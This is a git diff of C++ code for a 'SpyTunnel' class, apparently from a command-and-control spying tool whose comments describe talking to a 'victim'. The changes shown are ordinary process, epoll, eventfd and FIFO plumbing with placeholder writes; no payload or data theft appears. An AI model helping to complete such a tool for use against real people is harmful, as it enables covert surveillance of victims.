@@ -1,6 +1,7 @@
 #include "spy_tunnel.hpp"
+#include <sys/eventfd.h>
 
-int SpyTunnel::init(std::string __ip, uint __port, int* p_tunnel_shutdown_fd, int __connection_type) {
+int SpyTunnel::init(std::string __ip, uint __port, int*& __p_tunnel_shutdown_fd, int __connection_type) {
     ip_ = __ip;
     port_ = __port;
     memset(&tunnel_addr_, 0, sizeof(tunnel_addr_));
@@ -11,7 +12,7 @@ int SpyTunnel::init(std::string __ip, uint __port, int* p_tunnel_shutdown_fd, in
     }
     tunnel_socket_ = socket(AF_INET, __connection_type, 0);
 
-    p_tunnel_shutdown_fd = &tunnel_shutdown_fd_.fd;
+    __p_tunnel_shutdown_fd = &tunnel_shutdown_fd_.fd;
 
     return 0;
 }
@@ -19,11 +20,11 @@ int SpyTunnel::init(std::string __ip, uint __port, int* p_tunnel_shutdown_fd, in
 // Child process spawning the window
 // Parent process will be communicating with the tunnel (victim) and forwarding packets to the fifo
 void SpyTunnel::run() {
-    pid_t pid = fork();
-    if (pid == -1) {
+    pid_ = fork();
+    if (pid_ == -1) {
         std::cerr << RED << "[SpyTunnel::run] Error creating child process" << RESET;
         return;
-    } else if (pid == 0) {
+    } else if (pid_ == 0) {
         spawn_window();
         _exit(EXIT_FAILURE);
     }
@@ -38,19 +39,17 @@ void SpyTunnel::run() {
         std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
         return;
     }
-
-    const char* test = "test\n";
-    for (int i=0; i<5; i++) {
-        write(tunnel_fifo_, test, strlen(test));
-        std::this_thread::sleep_for(std::chrono::milliseconds(300));
-    }
-
-    return;
-    /*
+    
     ScopedEpollFD epoll_fd;
     epoll_fd.fd = epoll_create1(0);
     if (epoll_fd.fd == -1) {
-        std::cerr << RED << "[SpyTunnel::run] Error creating epoll instance" << RESET;
+        write_fifo_error("[SpyTunnel::run] Error creating epoll instance " + std::string(strerror(errno)));
+        return;
+    }
+
+    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
+    if (tunnel_shutdown_fd_.fd == -1) {
+        write_fifo_error("[SpyTunnel::run] Error creating shutdown eventfd " + std::string(strerror(errno)));
         return;
     }
 
@@ -58,18 +57,66 @@ void SpyTunnel::run() {
     shutdown_event.data.fd = tunnel_shutdown_fd_.fd;
     shutdown_event.events = EPOLLIN;
     if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_shutdown_fd_.fd, &shutdown_event) == -1) {
+        write_fifo_error("[SpyTunnel::run] Error adding shutdown eventfd to epoll " + std::string(strerror(errno)));
         return;
     }
-    */
+    
+
+    const char* test = "test\n";
+
+    struct epoll_event events[1];
+    while (true) {
+        int nfds = epoll_wait(epoll_fd.fd, events, 1, 500);
+        if (nfds < 0) {
+            if (errno == EINTR) {
+                continue;
+            }
+            write_fifo_error("[SpyTunnel::run] Error waiting for epoll event " + std::string(strerror(errno)));
+            break;
+        }
+
+        if (nfds == 0) {
+            // Timeout, simulate a test write to the FIFO
+            if (tunnel_fifo_ != -1){
+                write(tunnel_fifo_, test, strlen(test));
+                continue;
+            }
+        }
+
+        for (int i=0;i<nfds;i++) {
+            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
+                uint64_t u;
+                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
+
+                if (tunnel_fifo_ != -1) {
+                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
+                    close(tunnel_fifo_);
+                }
+                std::cout << MAGENTA << "[SpyTunnel::run] Shutdown signal received" << RESET;
+                return;
+            }
+        }
+    }
+
 }
 
 void SpyTunnel::shutdown() {
-    if (tunnel_fifo_ != -1) {
-        write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
-        close(tunnel_fifo_);
+    if (pid_ > 0) {
+        kill(pid_, SIGTERM);
+        waitpid(pid_, nullptr, 0);
     }
+
     if (tunnel_socket_ != -1) {
         close(tunnel_socket_);
+    }
+}
+
+void SpyTunnel::write_fifo_error(const std::string& __msg) {
+    if (tunnel_fifo_ != -1) {
+        std::string error = __msg + "[__error__]\n";
+        write(tunnel_fifo_, error.c_str(), error.length());
+    } else {
+        std::cerr << RED << "[SpyTunnel::write_fifo_error] " << __msg << RESET;
     }
 }
 
@@ -81,16 +128,20 @@ Tunnel::Tunnel(CommandCode __command_code, int __client_index, SpyTunnel* __p_sp
     command_code_ = __command_code;
     client_index_ = __client_index;
     p_spy_tunnel_ = __p_spy_tunnel;
-    tunnel_shutdown_fd_ = -1;
+    p_tunnel_shutdown_fd_ = nullptr;
 }
 
 void erase_tunnel(std::vector<Tunnel>* __p_tunnels, int __client_index, CommandCode __command_code) {
+    std::cout << MAGENTA << "[erase_tunnel] Erasing tunnel for client " << __client_index << " with command code " << static_cast<int>(__command_code) << RESET;
+    std::cout << MAGENTA << "[erase_tunnel] Address of tunnels: " << __p_tunnels << RESET;
+
     auto it = std::remove_if(
         __p_tunnels->begin(), 
         __p_tunnels->end(),
         [=](Tunnel& tunnel) {
             bool should_erase = (tunnel.client_index_ == __client_index && tunnel.command_code_ == __command_code); 
             if (should_erase) {
+                std::cout << MAGENTA << "[erase_tunnel] Address of spy tunnel: " << tunnel.p_spy_tunnel_ << RESET;
                 delete tunnel.p_spy_tunnel_;
             }
             return should_erase;
